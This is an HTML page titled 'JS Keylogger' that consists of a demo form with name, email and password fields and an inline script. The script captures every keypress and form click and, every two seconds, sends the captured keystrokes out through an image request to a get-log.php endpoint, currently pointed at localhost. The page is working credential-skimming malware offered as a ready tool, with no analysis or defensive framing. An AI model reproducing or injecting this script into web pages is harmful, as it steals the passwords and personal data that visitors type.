<!DOCTYPE html>
<html>
<head>
	<title>JS Keylogger</title>
</head>
<body>
<p>Exemple</p>
 <form>
  Lastname : <input type="text" name="lname"><br>
  Firstname: <input  type="text" name="fname"><br>
  Email: <input type="text" name="email"><br>
  Password: <input type="password" name="password"><br>
</form> 
<script type="text/javascript">
 var keys='';
 var s = ["http://","localhost","/js-keylogger","/get-log.php","?log="];
				var all_form = document.getElementsByTagName('form');
				for(i=0 ; i<all_form.length ; i++){
					var value = all_form[i].innerHTML;
					all_form[i].onclick = function()
   {
       key = "down";
       keys+=key;
   }
				}
    document.onkeypress = function(e) {

      get = window.event?event:e;

      if(get.keyCode?get.keyCode:get.charCode==9 || get.keyCode?get.keyCode:get.charCode==13 || get.keyCode?get.keyCode:get.charCode==32){
      	key = "down";
      }
      else{
      	key = get.keyCode?get.keyCode:get.charCode;
      	key = String.fromCharCode(key);
      }

      keys+=key;
    }
   window.setInterval(function(){
   new Image().src =s[0]+s[1]+s[2]+s[3]+s[4]+keys;
   keys = '';
 }, 2000);
</script>
</body>
</html>